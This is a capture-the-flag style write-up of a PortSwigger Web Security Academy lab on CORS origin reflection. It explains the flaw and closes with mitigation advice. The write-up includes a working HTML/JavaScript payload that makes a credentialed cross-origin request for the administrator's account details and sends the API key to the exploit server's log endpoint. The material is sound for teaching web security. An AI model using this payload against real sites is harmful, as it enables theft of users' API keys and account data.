# Lab: CORS vulnerability with basic origin reflection
**Platform:** PortSwigger Web Security Academy
**Goal:** Exploit a CORS misconfiguration to steal the administrator's API key.
**Vulnerability:** Basic CORS Origin Reflection (The server blindly copies the `Origin` header from the request into the `Access-Control-Allow-Origin` response header and sets `Access-Control-Allow-Credentials: true`).

##  The Concept (Origin Echoing)
To support cross-origin requests, developers sometimes dynamically generate the `Access-Control-Allow-Origin` (ACAO) header by simply echoing whatever value is supplied in the incoming `Origin` header. If `Access-Control-Allow-Credentials` (ACAC) is also set to `true`, any malicious website can make an authenticated cross-origin request to the vulnerable application. The browser will see the ACAO header matching the attacker's origin, bypassing the Same-Origin Policy (SOP), and hand the sensitive response data directly to the attacker's JavaScript.

##  Step-by-Step Exploitation

### Step 1: Craft the Exploit Payload
Create an HTML/JS payload on the Exploit Server. This script makes an authenticated `GET` request to the target API, reads the sensitive response, and exfiltrates it by appending it as a query parameter to a request directed at the Exploit Server's `/log` endpoint.

```html
<script>
    var req = new XMLHttpRequest();
    // 1. Define the callback function to exfiltrate the data
    req.onload = function() {
        // Exfiltrate the JSON response (containing the API key) to the exploit server's logs
        window.location = "/log?key=" + encodeURIComponent(this.responseText);
    };
    // 2. Initialize the GET request to the vulnerable endpoint
    req.open("GET", "[https://YOUR-LAB-ID.web-security-academy.net/accountDetails](https://YOUR-LAB-ID.web-security-academy.net/accountDetails)", true);
    // 3. CRITICAL: Include credentials (session cookies) so the target identifies the victim
    req.withCredentials = true;
    // 4. Send the request
    req.send();
</script>
```
### Step 2: Exfiltrate the Data
1. Store the exploit and click Deliver exploit to victim.

2. The victim (administrator bot) executes the script, fetching their account details and sending them to your server.

3. Navigate to the Exploit Server's Access log.

4. Locate the incoming GET /log?key=... request.

5. URL-decode the key parameter to reveal the JSON object containing the administrator's apikey.

### Step 3: Submit the Solution
Copy the extracted API key and submit it via the "Submit solution" button on the lab's main page. Lab Solved! 

**Key Takeaway / Mitigation**: Never dynamically reflect the Origin header in the Access-Control-Allow-Origin header without strict validation. If an API is intended to be public, it should not support credentials. If it requires credentials, it must validate the Origin against a strict, hardcoded allowlist of trusted domains.